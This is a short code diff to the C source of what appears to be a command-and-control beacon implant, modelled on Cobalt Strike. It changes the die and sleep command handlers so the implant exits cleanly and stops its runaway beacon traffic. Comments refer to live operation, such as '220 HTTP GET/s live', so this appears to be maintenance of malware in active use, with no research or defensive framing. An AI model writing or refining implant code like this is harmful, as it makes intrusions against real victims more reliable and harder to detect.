@@ -21,8 +21,16 @@ extern unsigned int post_type;
 extern HANDLE atoken;
 
 /* 终止信标 */
+BOOL beacon_dying = FALSE;
+
 void command_die(void(*cb)(char * buffer, int length, int type)) {
 	//dlog("Received die command (really)!!!\n");
+	/* 2026-11-04: the exit task must actually terminate. The old code only
+	 * zeroed sleep_time - with the `while (sleep_time > 0)` gate gone the
+	 * loop kept spinning at full speed (220 HTTP GET/s live) and, because
+	 * command_sleep early-returned on sleep_time == 0, EVERY later sleep
+	 * task was silently dropped (the live "sleep does not work" report). */
+	beacon_dying = TRUE;
 	sleep_time = 0;
 	cb(NULL, 0, CALLBACK_DEAD);
 }
@@ -65,7 +73,10 @@ void command_sleep(char * buffer, int length) {
 	datap parser;
 
 	/* CS-13: 休眠更新不应覆盖零休眠时间（等待退出） */
-	if (sleep_time == 0) {
+	/* exit in flight: ignore further tasking (keying this on
+	 * sleep_time == 0 also swallowed every sleep task after an exit
+	 * had zeroed it - sleeping could never be re-enabled) */
+	if (beacon_dying) {
 		//dlog("Sleep has already been set to magic number (%d).  Ignoring sleep command.\n", sleep_time);
 		return;
 	}
